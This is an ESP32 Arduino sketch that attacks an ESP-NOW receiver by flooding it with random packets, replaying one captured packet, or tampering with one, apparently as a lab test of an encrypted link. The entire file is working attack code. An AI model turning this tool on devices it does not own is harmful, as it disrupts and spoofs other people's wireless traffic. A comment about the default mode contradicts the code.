/*
 * attacker.ino — sends FLOOD / REPLAY / TAMPER traffic at the legit receiver
 * No AES key needed: flood is garbage, replay/tamper reuse one captured packet.
 */
#include <esp_now.h>
#include <WiFi.h>

#define MODE_FLOOD  0
#define MODE_REPLAY 1
#define MODE_TAMPER 2
// Default to replay so a freshly flashed attacker runs the intended demo.
// For the experiment, capture a valid 39-byte packet from your own sender,
// paste its hex bytes below, and make sure the legitimate sender is stopped.
#define ATTACK_MODE MODE_TAMPER

uint8_t receiverMac[] = { 0x8C, 0x94, 0xDF, 0x6B, 0xF1, 0x34 }; // same as sender's target

// hex string 
const char* capturedHex = "8FD807F7911A99BE665CBE3A1D4A606102AE77204AA0A44320C78508F96208EB1EDF5364C506E4";
uint8_t capturedPkt[64];
int pktLen = 0;

void hexToBytes(const char* hex, uint8_t* out, int* len) {
  int n = strlen(hex) / 2;
  for (int i = 0; i < n; i++) {
    char b[3] = { hex[i*2], hex[i*2+1], 0 };
    out[i] = (uint8_t)strtol(b, NULL, 16);
  }
  *len = n;
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_STA);
  esp_now_init();
  esp_now_peer_info_t peer = {};
  memcpy(peer.peer_addr, receiverMac, 6);
  peer.channel = 0;
  peer.encrypt = false;
  esp_now_add_peer(&peer);

  hexToBytes(capturedHex, capturedPkt, &pktLen);
  if (pktLen != 39) {
    Serial.printf("# ERROR: captured packet must be 39 bytes; got %d\n", pktLen);
    while (true) delay(1000);
  }
  randomSeed(esp_random());
  Serial.printf("# Attacker ready. mode=%d capturedLen=%d\n", ATTACK_MODE, pktLen);
}

void loop() {
#if ATTACK_MODE == MODE_FLOOD
  uint8_t junk[39];
  for (int i = 0; i < 39; i++) junk[i] = random(0, 256);
  esp_now_send(receiverMac, junk, sizeof(junk));
  // no delay: max rate flood

#elif ATTACK_MODE == MODE_REPLAY
  esp_now_send(receiverMac, capturedPkt, pktLen);
  Serial.println("# replayed captured packet");
  delay(500);   // adjust: replay cadence

#elif ATTACK_MODE == MODE_TAMPER
  uint8_t tampered[64];
  memcpy(tampered, capturedPkt, pktLen);
  int flipIdx = random(12, pktLen);     // flip a byte inside ciphertext/tag, not IV
  tampered[flipIdx] ^= 0xFF;
  esp_now_send(receiverMac, tampered, pktLen);
  Serial.printf("# tampered byte %d sent\n", flipIdx);
  delay(500);
#endif
}
